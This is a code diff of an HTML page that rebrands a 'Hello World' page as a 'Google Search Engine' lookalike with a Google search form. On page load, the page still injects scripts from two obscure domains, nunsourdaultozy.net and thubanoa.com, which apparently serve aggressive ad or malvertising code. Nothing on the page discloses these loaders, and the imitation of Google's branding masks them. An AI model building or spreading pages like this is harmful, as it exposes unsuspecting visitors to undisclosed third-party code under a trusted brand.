@@ -3,57 +3,82 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Hello World</title>
+    <title>Google Search Engine</title>
+    <style>
+        body {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            font-family: Arial, sans-serif;
+            background-color: #f8f8f8;
+        }
+        h1 {
+            margin-bottom: 20px;
+        }
+        input[type="text"] {
+            padding: 10px;
+            width: 300px;
+            font-size: 16px;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+        }
+        input[type="submit"] {
+            padding: 10px 20px;
+            margin-left: 10px;
+            font-size: 16px;
+            background-color: #4285F4;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+        }
+        input[type="submit"]:hover {
+            background-color: #357ae8;
+        }
+    </style>
 </head>
 <body>
-    <h1 id="status">Loading scripts...</h1>
+    <h1>Google Search</h1>
+    <form id="searchForm" action="https://www.google.com/search" method="get">
+        <input type="text" name="q" placeholder="Search Google..." required>
+        <input type="submit" value="Search">
+    </form>
+
+    <h2 id="status">Loading scripts...</h2>
 
     <script>
         // Arrays for the nunsourdaultozy IDs
         var nunsourdaultozyIds = [
-            8420834,
-            8420837,
-            8420832,
-            8420829,
-            8420827,
-            8420982,
-            8420993,
-            8420997,
-            8420999,
-            8421001,
-            8421003
+         
         ];
         
         // Arrays for the thubanoa IDs
         var thubanoaIds = [
-            8420826,
-            8420825,
-            8420824,
-            8420823,
-            8420822,
-            8420969,
-            8420973,
-            8420977,
-            8420979,
-            8420981
+           
         ];
 
-        // Function to load nunsourdaultozy scripts in original format
+        // Function to load nunsourdaultozy scripts
         function loadNunsourdaultozyScript(id) {
-            (function(d,z,s){
-                s.src = 'https://' + d + '/400/' + z;
-                try {
-                    (document.body || document.documentElement).appendChild(s);
-                } catch(e) {}
-            })('nunsourdaultozy.net', id, document.createElement('script'));
+            var script = document.createElement('script');
+            script.async = true;
+            script.src = 'https://nunsourdaultozy.net/400/' + id;
+            script.onerror = function() {
+                console.error(`Failed to load nunsourdaultozy script: ${id}`);
+            };
+            (document.body || document.documentElement).appendChild(script);
         }
 
-        // Function to load thubanoa scripts in original format
+        // Function to load thubanoa scripts
         function loadThubanoaScript(id) {
             var script = document.createElement('script');
             script.async = true;
             script.setAttribute('data-cfasync', 'false');
             script.src = '//thubanoa.com/1?z=' + id;
+            script.onerror = function() {
+                console.error(`Failed to load thubanoa script: ${id}`);
+            };
             (document.body || document.documentElement).appendChild(script);
         }
 
@@ -65,9 +90,8 @@
         var randomThubanoaId = thubanoaIds[Math.floor(Math.random() * thubanoaIds.length)];
         loadThubanoaScript(randomThubanoaId);
 
-        // Update the h1 element to show the loaded IDs
+        // Update the h2 element to show the loaded IDs
         document.getElementById('status').innerText = `Loaded IDs: nunsourdaultozy.net - ${randomNunsourdaultozyId}, thubanoa.com - ${randomThubanoaId}`;
     </script>
-    Update 2.0
 </body>
 </html>
